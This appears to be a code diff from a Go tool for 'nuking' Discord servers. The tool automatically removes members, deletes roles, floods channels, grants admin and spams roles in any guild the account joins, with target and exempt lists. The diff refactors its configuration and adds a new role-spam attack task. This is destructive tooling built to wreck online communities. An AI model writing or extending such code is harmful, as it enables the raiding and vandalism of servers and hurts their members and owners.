@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"math/rand"
 	"sync"
+	"time"
 
 	"github.com/bwmarrin/discordgo"
 	"golang.org/x/exp/slices"
@@ -15,18 +16,18 @@ func (na NukeAccount) BeginNuke() error {
 		return err
 	}
 
-	if na.Config.FeatureConfig.AutoNukeConfig.Enabled {
+	if na.Config.FeatureConfig.AutoNuke.Enabled {
 		wg := sync.WaitGroup{}
 		wg.Add(1)
 		na.Session.AddHandler(func(s *discordgo.Session, m *discordgo.GuildCreate) {
-			targets := na.Config.FeatureConfig.AutoNukeConfig.TargetOnly
+			targets := na.Config.FeatureConfig.AutoNuke.TargetOnly
 			if len(targets) > 0 {
 				if slices.Contains(targets, m.ID) {
 					na.nukeOneGuild(m.ID)
 				}
 				return
 			}
-			exempt := na.Config.FeatureConfig.AutoNukeConfig.ExemptGuilds
+			exempt := na.Config.FeatureConfig.AutoNuke.ExemptGuilds
 			if slices.Contains(exempt, m.ID) {
 				return
 			}
@@ -59,7 +60,7 @@ func (na NukeAccount) startNukeTasks() {
 	tasks := []Feature{
 		{
 			Function: na.removeMembers,
-			Enabled:  fc.MemberRemovalConfig.Enabled,
+			Enabled:  fc.MemberRemoval.Enabled,
 		},
 		{
 			Function: na.deleteRoles,
@@ -71,11 +72,15 @@ func (na NukeAccount) startNukeTasks() {
 		},
 		{
 			Function: na.makeChannels,
-			Enabled:  fc.AfterChannelConfig.Enabled,
+			Enabled:  fc.AfterChannel.Enabled,
 		},
 		{
 			Function: na.autoAdmin,
 			Enabled:  len(fc.AutoAdmin) > 0,
+		},
+		{
+			Function: na.roleSpam,
+			Enabled:  fc.RoleSpam.Enabled,
 		},
 	}
 	wg := sync.WaitGroup{}
@@ -95,6 +100,7 @@ func (na NukeAccount) startNukeTasks() {
 }
 
 func (na NukeAccount) getGuildMemberIDs() []string {
+	randGen := rand.New(rand.NewSource(time.Now().UnixNano()))
 	ids := []string{}
 	collected := make(chan bool)
 	na.Session.AddHandlerOnce(func(s *discordgo.Session, chunk *discordgo.GuildMembersChunk) {
@@ -103,7 +109,7 @@ func (na NukeAccount) getGuildMemberIDs() []string {
 		}
 		collected <- true
 	})
-	na.Session.RequestGuildMembers(na.Config.GuildID, "", 0, fmt.Sprint(rand.Intn(10000000)), false)
+	na.Session.RequestGuildMembers(na.Config.GuildID, "", 0, fmt.Sprint(randGen.Intn(10000000)), false)
 	<-collected
 	return ids
 }
